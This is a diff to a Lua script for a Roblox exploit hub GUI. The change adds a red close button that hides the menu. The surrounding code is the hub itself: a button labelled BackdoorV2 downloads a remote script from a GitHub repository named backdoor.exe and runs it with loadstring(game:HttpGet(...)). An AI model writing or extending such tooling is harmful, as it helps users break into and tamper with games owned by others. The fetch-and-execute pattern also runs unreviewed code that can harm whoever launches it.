@@ -10,6 +10,7 @@ local GUIcredits = Instance.new("TextLabel")
 local EZHub = Instance.new("TextButton")
 local DomainV2 = Instance.new("TextButton")
 local BackdoorV2 = Instance.new("TextButton")
+local GUIclose = Instance.new("TextButton")
 
 --Properties:
 
@@ -91,3 +92,26 @@ BackdoorV2.TextSize = 14.000
 BackdoorV2.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
 end)
+
+GUIclose.Name = "GUIclose"
+GUIclose.Parent = SimpleFrame
+GUIclose.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+GUIclose.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GUIclose.Size = UDim2.new(0, 28, 0, 27)
+GUIclose.Font = Enum.Font.SourceSans
+GUIclose.Text = "X"
+GUIclose.TextColor3 = Color3.fromRGB(0, 0, 0)
+GUIclose.TextScaled = true
+GUIclose.TextSize = 14.000
+GUIclose.TextWrapped = true
+
+-- Scripts:
+
+local function LZCQ_fake_script() -- GUIclose.LocalScript 
+	local script = Instance.new('LocalScript', GUIclose)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+end
+coroutine.wrap(LZCQ_fake_script)()
